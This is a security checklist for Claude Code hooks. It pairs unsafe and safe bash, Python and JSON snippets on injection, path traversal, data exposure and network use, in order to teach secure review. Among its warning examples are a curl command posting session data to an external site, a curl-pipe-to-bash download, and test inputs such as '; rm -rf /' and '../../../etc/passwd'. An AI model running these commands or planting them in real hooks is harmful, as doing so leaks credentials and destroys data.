# Security Checklist for Hooks

Comprehensive security validation requirements for Claude Code hooks.

## Critical Security Warning

**Hooks execute automatically with your environment credentials.** Malicious or poorly written hooks can:
- Exfiltrate sensitive data (API keys, credentials, code)
- Execute destructive commands
- Modify files inappropriately
- Expose system information
- Create security vulnerabilities

**Always thoroughly review hooks before deployment.**

## Pre-Deployment Security Checklist

### Input Validation

- [ ] All user-provided inputs are validated before use
- [ ] File paths checked for path traversal attempts (`../`, `..\\`)
- [ ] Absolute paths validated to prevent unauthorized access
- [ ] String inputs sanitized to prevent injection attacks
- [ ] Unexpected input patterns cause script to fail safely
- [ ] Missing required fields handled gracefully
- [ ] Input length limits enforced where appropriate
- [ ] Special characters in inputs are escaped or validated

**Common Vulnerabilities**:
```bash
# BAD: No validation
FILE_PATH="$INPUT_PATH"
cat "$FILE_PATH"

# GOOD: Validate path
if [[ "$INPUT_PATH" =~ \.\. ]]; then
  echo "Path traversal detected" >&2
  exit 2
fi
FILE_PATH="$INPUT_PATH"
```

### Command Injection Prevention

- [ ] All variables are quoted in bash: `"$VAR"` not `$VAR`
- [ ] No use of `eval` or dynamic command construction
- [ ] Commands use absolute paths or validated PATH
- [ ] User input never directly incorporated into commands
- [ ] Shell metacharacters escaped appropriately
- [ ] Subprocess calls use array arguments (Python) not string concatenation

**Common Vulnerabilities**:
```bash
# BAD: Unquoted variable allows injection
rm -rf $USER_INPUT

# GOOD: Quoted variable
rm -rf "$USER_INPUT"

# BAD: Dynamic command construction
eval "$USER_COMMAND"

# GOOD: Validate and use fixed commands
if [[ "$OPERATION" == "delete" ]]; then
  rm -f "$FILE"
fi
```

```python
# BAD: Shell injection risk
os.system(f"rm {file_path}")

# GOOD: Use subprocess with array
subprocess.run(["rm", file_path], check=True)
```

### Path Security

- [ ] Path traversal blocked: no `../` or `..\\`
- [ ] Absolute paths validated against allowed directories
- [ ] Symbolic links handled appropriately
- [ ] File permissions checked before operations
- [ ] World-writable directories avoided
- [ ] Temporary files created securely
- [ ] Hidden files (`.env`, `.git`) protected appropriately

**Common Vulnerabilities**:
```python
# BAD: Path traversal vulnerability
file_path = tool_input.get("file_path")
with open(file_path, "w") as f:
    f.write(content)

# GOOD: Validate path
file_path = tool_input.get("file_path", "")
if ".." in file_path or file_path.startswith("/etc"):
    print("Invalid path", file=sys.stderr)
    sys.exit(2)
```

### Data Protection

- [ ] No sensitive data logged (API keys, passwords, tokens)
- [ ] No credentials written to files
- [ ] Environment variables containing secrets not echoed
- [ ] Sensitive data not included in error messages
- [ ] Audit logs don't contain sensitive content
- [ ] Network requests don't exfiltrate data
- [ ] Clipboard operations validated

**Common Vulnerabilities**:
```bash
# BAD: Logging entire environment
env >> debug.log

# GOOD: Log only specific variables
echo "PROJECT_DIR=$PROJECT_DIR" >> debug.log

# BAD: Error exposes sensitive data
echo "Failed to connect with key: $API_KEY" >&2

# GOOD: Generic error message
echo "Failed to connect (authentication error)" >&2
```

### Error Handling

- [ ] Errors don't expose system paths
- [ ] Errors don't reveal sensitive information
- [ ] Failures default to safe state (fail closed)
- [ ] Unexpected errors caught and handled
- [ ] Error messages are user-friendly but not revealing
- [ ] Logging errors doesn't create vulnerabilities

**Best Practices**:
```python
try:
    # Hook logic
    process_file(file_path)
except FileNotFoundError:
    print("File not found", file=sys.stderr)
    sys.exit(0)  # Fail safely
except Exception as e:
    # Don't expose details
    print("Hook execution failed", file=sys.stderr)
    sys.exit(0)
```

## Configuration Security

### Matcher Security

- [ ] Matchers appropriately scoped (not overly broad)
- [ ] Regex patterns validated and tested
- [ ] MCP tool patterns don't match unintended tools
- [ ] Multiple matchers don't create conflicts

**Examples**:
```json
// BAD: Too broad, matches everything
"matcher": ".*"

// GOOD: Specific tools
"matcher": "Write|Edit"

// BAD: Unintended MCP matches
"matcher": "mcp__.*"  // Matches ALL MCP tools

// GOOD: Specific MCP server or tool type
"matcher": "mcp__memory__.*"
```

### Timeout Security

- [ ] Timeouts prevent infinite loops
- [ ] Timeouts reasonable for operation
- [ ] Long timeouts justified and documented
- [ ] No timeout bypasses system limits

### Tool Restrictions

- [ ] allowed-tools set for read-only hooks if appropriate
- [ ] Hooks don't have unnecessary tool access
- [ ] Tool restrictions documented

## Script Security

### Permissions

- [ ] Scripts are not world-writable: `chmod 755` not `chmod 777`
- [ ] Scripts owned by appropriate user
- [ ] Script directory permissions appropriate
- [ ] No unnecessary execute permissions on data files

**Check Permissions**:
```bash
# Good permissions
-rwxr-xr-x  1 user  group  123 script.sh

# Bad permissions (world-writable)
-rwxrwxrwx  1 user  group  123 script.sh
```

### Script Content

- [ ] Shebang line present and correct
- [ ] `set -e` used in bash (fail on error)
- [ ] No hardcoded credentials
- [ ] No debugging code left in production
- [ ] Comments don't contain sensitive information
- [ ] No commented-out malicious code

### Dependencies

- [ ] External commands exist and are from trusted sources
- [ ] Python packages are from PyPI or trusted repos
- [ ] Dependency versions pinned or validated
- [ ] No untrusted remote scripts executed

## Environment Security

### Environment Variables

- [ ] Only necessary environment variables accessed
- [ ] `$CLAUDE_PROJECT_DIR` used appropriately
- [ ] No environment manipulation for malicious purposes
- [ ] Sensitive variables not logged or exposed

### File System

- [ ] Hooks operate only in appropriate directories
- [ ] No operations in system directories (`/etc`, `/usr`)
- [ ] Temporary files cleaned up
- [ ] File creation uses safe permissions

### Network

- [ ] Network requests justified and documented
- [ ] URLs validated and not user-provided
- [ ] HTTPS used for external requests
- [ ] No data exfiltration to external services
- [ ] Timeouts on network operations

**Warning Signs**:
```bash
# Suspicious: Exfiltration attempt
curl -X POST https://external-site.com -d "$SESSION_DATA"

# Suspicious: Downloading and executing code
curl https://unknown-site.com/script.sh | bash
```

## Validation Testing

### Automated Tests

- [ ] Test with malicious input: `../../../etc/passwd`
- [ ] Test with shell metacharacters: `; rm -rf /`
- [ ] Test with missing required fields
- [ ] Test with unexpected data types
- [ ] Test with extremely long inputs
- [ ] Test with special characters: quotes, backticks, newlines

### Manual Review

- [ ] Code reviewed by another person
- [ ] Logic flow understood completely
- [ ] All code paths tested
- [ ] Security implications considered
- [ ] Documentation accurate

### Integration Testing

- [ ] Hook loads without errors
- [ ] Hook behaves correctly in real usage
- [ ] Hook doesn't interfere with normal operations
- [ ] Hook performance acceptable
- [ ] Hook logs appropriate information

## Security Red Flags

Immediately investigate if hook contains:

**🚨 Critical Red Flags**:
- `eval` command
- Unquoted variables in bash
- Direct command construction from user input
- Network requests to unknown domains
- Base64 encoded data (potential obfuscation)
- Writing to `/etc`, `/usr`, or system directories
- Accessing `/proc` or `/dev` without reason
- Credentials hardcoded in script

**⚠️ Warning Signs**:
- Complex regex without explanation
- Overly broad file operations
- Unnecessary network access
- Logging entire inputs or environment
- Disabled error handling
- Unusual subprocess usage
- Obfuscated code
- No comments explaining security-sensitive code

## Security Review Process

1. **Initial Review**:
   - Read entire script
   - Understand purpose and logic
   - Identify all inputs and outputs
   - Map data flow

2. **Threat Modeling**:
   - What could malicious input do?
   - What system resources are accessed?
   - What credentials are available?
   - What's the worst case scenario?

3. **Code Analysis**:
   - Check all items in this checklist
   - Review each conditional and loop
   - Validate all external calls
   - Verify error handling

4. **Testing**:
   - Run automated security tests
   - Manual testing with malicious inputs
   - Integration testing
   - Performance testing

5. **Documentation Review**:
   - Security considerations documented
   - Risks acknowledged
   - Mitigations explained
   - Usage guidelines clear

## Remediation Guidelines

### Fixing Input Validation

```python
# Add validation function
def validate_file_path(path):
    """Validate file path for security"""
    if not path:
        return False
    if ".." in path:
        return False
    if path.startswith("/etc") or path.startswith("/usr"):
        return False
    return True

# Use before operations
file_path = tool_input.get("file_path", "")
if not validate_file_path(file_path):
    print("Invalid file path", file=sys.stderr)
    sys.exit(2)
```

### Fixing Command Injection

```bash
# Use whitelisting
case "$OPERATION" in
  "format")
    prettier --write "$FILE_PATH"
    ;;
  "lint")
    eslint "$FILE_PATH"
    ;;
  *)
    echo "Unknown operation" >&2
    exit 2
    ;;
esac
```

### Fixing Data Exposure

```python
# Sanitize before logging
def sanitize_for_log(data):
    """Remove sensitive data before logging"""
    if isinstance(data, dict):
        safe_data = data.copy()
        for key in ["api_key", "password", "token", "secret"]:
            if key in safe_data:
                safe_data[key] = "***REDACTED***"
        return safe_data
    return data

# Log safely
print(json.dumps(sanitize_for_log(input_data)), file=sys.stderr)
```

## Security Maintenance

- **Regular Reviews**: Review hooks quarterly
- **Update Dependencies**: Keep scripts and dependencies current
- **Monitor Logs**: Watch for suspicious behavior
- **Incident Response**: Plan for security incidents
- **Team Training**: Ensure team understands hook security
- **Documentation**: Keep security docs current

## Resources

- Official Claude Code security documentation
- OWASP guidelines for shell security
- Python security best practices
- Bash scripting security guides
